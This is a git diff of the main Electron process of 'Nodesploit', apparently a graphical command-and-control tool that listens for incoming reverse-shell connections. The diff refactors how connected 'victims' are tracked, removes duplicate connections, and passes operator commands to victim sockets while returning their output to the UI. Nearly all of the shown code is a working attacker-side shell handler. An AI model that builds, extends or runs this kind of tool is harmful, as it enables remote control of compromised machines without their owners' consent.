@@ -1,9 +1,8 @@
-const { app, ipcMain, Notification } = require("electron");
-
-import { mainWindow, loadingWindow } from "./window";
+import { app, ipcMain, Notification } from "electron";
 import { nanoid } from "nanoid";
-
+import { mainWindow, loadingWindow } from "./window";
 import store from "@/store";
+
 /**
  * Set `__static` path to static files in production
  * https://simulatedgreg.gitbooks.io/electron-vue/content/en/using-static-assets.html
@@ -14,7 +13,16 @@ if (process.env.NODE_ENV !== "development") {
     .replace(/\\/g, "\\\\");
 }
 
+/** @class Nodesploit */
 class Nodesploit {
+  /**
+   * @constructor
+   * @param  {BrowserWindow} mainWin
+   * @param  {BrowserWindow} loadWin
+   * @param  {Server} server
+   * @param  {Map} sockets
+   *
+   */
   constructor() {
     this.mainWin = null;
     this.loadWin = null;
@@ -22,15 +30,22 @@ class Nodesploit {
     this.sockets = new Map();
   }
 
+  /**
+   * Function to initalise life cycle of application.
+   */
   init() {
-    this.lifecycle();
-    this.ipc();
-  }
-
-  lifecycle() {
     app.on("ready", () => {
       this.loadWin = loadingWindow();
-      this.createMainWindow();
+      this.mainWin = mainWindow();
+
+      this.mainWin.webContents.on("did-finish-load", () => {
+        this.mainWin.show();
+        this.loadWin.destroy();
+      });
+
+      this.mainWin.on("closed", () => {
+        this.mainWin = null;
+      });
     });
 
     app.on("window-all-closed", () => {
@@ -38,33 +53,24 @@ class Nodesploit {
         app.quit();
       }
     });
-
-    app.on("activate", () => {
-      if (mainWindow === null) {
-        createWindow();
-      }
-    });
   }
 
-  createMainWindow() {
-    this.mainWin = mainWindow();
-    this.mainWin.webContents.on("did-finish-load", () => {
-      this.mainWin.show();
-      this.loadWin.destroy();
-    });
-    this.mainWin.on("closed", () => {
-      this.mainWin = null;
-    });
-  }
-
+  /**
+   * Function to create and listening on server.
+   * @param  {Object} connection
+   * @return {Boolean} Listening OR Not listening
+   */
   createServer(connection) {
-    const net = require("net");
+    var net = require("net");
     this.server = new net.Server();
 
     process.on("SIGTERM", () => {
       this.server.close();
     });
 
+    /**
+     * This events is called when server is successfully listened, See {this.server.listen()} for more detaille
+     */
     this.server.on("listening", () => {
       if (store.getters.notification) {
         var notif = new Notification({
@@ -78,6 +84,9 @@ class Nodesploit {
       }
     });
 
+    /**
+     * This event is called when server is successfully closed
+     */
     this.server.on("close", () => {
       if (store.getters.notification) {
         var notif = new Notification({
@@ -86,71 +95,79 @@ class Nodesploit {
         });
         notif.show();
       }
-      this.mainWin.webContents.send("closeConnection");
     });
 
+    /**
+     * @param  {Error} e
+     * This events is called when error occur in server
+     */
     this.server.on("error", (e) => {
       if (e.code === "EADDRINUSE") {
         console.log("Address in use, retrying...");
-
-        // this.closeServer().then(() => {
-        //   this.server.listen(connection.port, connection.ip);
-        // });
       }
     });
 
+    /**
+     * This events is called when a new victime is connected to server
+     */
     this.server.on("connection", (socket) => {
-     
-      // this.sockets.push(socket)
-      socket.setDefaultEncoding("ascii");
-      socket.id = nanoid(10);
-      this.sockets.set(socket.id,socket)
-      store.dispatch("ADD_CHILD", { id: socket.id, ip: socket.remoteAddress});
-      console.log(`[💀] New Victime: ${socket.id}`);
+      var alreadyExist = false;
+      this.sockets.forEach((soc) => {
+        if (soc.remoteAddress == socket.remoteAddress) {
+          alreadyExist = true;
+        }
+      });
+      if (alreadyExist) {
+        socket.end();
+      } else {
+        socket.setKeepAlive(true, Infinity);
+        socket.setDefaultEncoding("utf8");
+        socket.id = nanoid(10);
 
-      if (store.getters.notification) {
-        var notif = new Notification({
-          title: "Nouvelles connexion !",
-          body: `une nouvelles connexion entrant ${socket.remoteAddress}`,
+        this.addVictime(socket);
+
+        socket.on("error", (e) => {
+          console.log(e);
+          if (e.code == "ECONNRESET") {
+            console.log("Socket end shell with CTRL+C");
+            console.log("DEL[ERROR]: " + socket.id);
+          }
         });
-        notif.show();
+
+        socket.on("close", () => {
+          console.log("DEL[CLOSE]: " + socket.id);
+          this.deleteVictime(socket.id);
+        });
+
+        socket.on("end", () => {
+          console.log("DEL[END]: " + socket.id);
+          this.deleteVictime(socket.id);
+        });
+
+        socket.on("timeout", () => {
+          console.log("timeoiut .");
+        });
+
+        var cmd = "";
+        ipcMain.on("cmd", (event, res) => {
+          cmd = res.msg.trim() + "\n";
+          var child = this.sockets.get(res.id);
+          child.write(cmd);
+        });
+
+        socket.on("data", (data) => {
+          if (cmd !== data) {
+            this.mainWin.webContents.send("datarec", data.toString("ascii"));
+          }
+        });
       }
-
-      // this.mainWin.webContents.send("newConnection", {
-      //   id: socket.id,
-      //   ip: socket.remoteAddress,
-      // });
-
-      // Socket is fully quitted
-
-      socket.on("error", (e) => {
-        console.log(e);
-        if (e.code == "ECONNRESET") {
-          console.log("Socket end shell with CTRL+C");
-        }
-      });
-
-      socket.on("close", () => {
-        this.mainWin.webContents.send("slaveQuitted", socket.id);
-      });
-
-      socket.on("end", () => {
-        this.mainWin.webContents.send("slaveQuitted", socket.id);
-      });
-
-      var cmd = "";
-      ipcMain.on("cmd", (event, res) => {
-        cmd = res.msg.trim() + "\n";
-        this.sockets.get(res.id).write(res.msg.trim() + "\n");
-      });
-
-      socket.on("data", (data) => {
-        if (cmd !== data) {
-          this.mainWin.webContents.send("datarec", data.toString("ascii"));
-        }
-      });
     });
 
+    /**
+     * @param  {String} host
+     * @param  {Number} port
+     * This events is called to etablish listening in server with IP & Port
+     */
     this.server.listen({ host: connection.ip, port: connection.port }, () => {
       console.log(`🔥 Server listen in ${connection.port}`);
     });
@@ -158,40 +175,79 @@ class Nodesploit {
     return this.server.listening;
   }
 
+  /**
+   * Function to close current open server.
+   * @return {Boolean}
+   */
   closeServer() {
     if (this.server.close()) {
       return true;
     }
   }
 
-  ipc() {
-    ipcMain.on("close-app", () => {
-      app.quit();
-    });
+  /**
+   * Function to delete or close connection of 'x' victime.
+   * @param {String} id
+   */
+  deleteVictime(id) {
+    store.dispatch("REMOVE_CHILD", id);
+    if (this.sockets.has(id)) {
+      this.sockets.get(id).destroy();
+      this.sockets.delete(id);
+    }
+  }
 
-    ipcMain.on("maximize-app", () => {
-      if (this.mainWin.isFullScreen()) {
-        this.mainWin.setFullScreen(false);
-      } else {
-        this.mainWin.setFullScreen(true);
-      }
-    });
+  /**
+   * Function to add socket in Sockets Map()
+   * @param  {Socket} socket
+   */
+  addVictime(socket) {
+    this.sockets.set(socket.id, socket);
+    store.dispatch("ADD_CHILD", { id: socket.id, ip: socket.remoteAddress });
+    console.log(`[💀] New Victime: ${socket.id}`);
 
-    ipcMain.on("minimize-app", () => {
-      this.mainWin.minimize();
-    });
-
-    ipcMain.handle("serverlisten", (event, connection) => {
-      this.createServer(connection);
-    });
-
-    ipcMain.handle("server-stoplisten", () => {
-      this.closeServer();
-    });
+    if (store.getters.notification) {
+      var notif = new Notification({
+        title: "Nouvelles connexion !",
+        body: `une nouvelles connexion entrant ${socket.remoteAddress}`,
+      });
+      notif.show();
+    }
   }
 }
 
-new Nodesploit().init();
+
+var ns = new Nodesploit();
+
+ns.init();
+
+ipcMain.on("close-app", () => {
+  app.quit();
+});
+
+ipcMain.on("maximize-app", () => {
+  if (ns.mainWin.isFullScreen()) {
+    ns.mainWin.setFullScreen(false);
+  } else {
+    ns.mainWin.setFullScreen(true);
+  }
+});
+
+ipcMain.on("minimize-app", () => {
+  ns.mainWin.minimize();
+});
+
+ipcMain.handle("serverlisten", (event, connection) => {
+  ns.createServer(connection);
+});
+
+ipcMain.handle("server-stoplisten", () => {
+  ns.closeServer();
+});
+
+ipcMain.on("delete_victime", (event, id) => {
+  ns.deleteVictime(id);
+});
 
 /**
  * Auto Updater
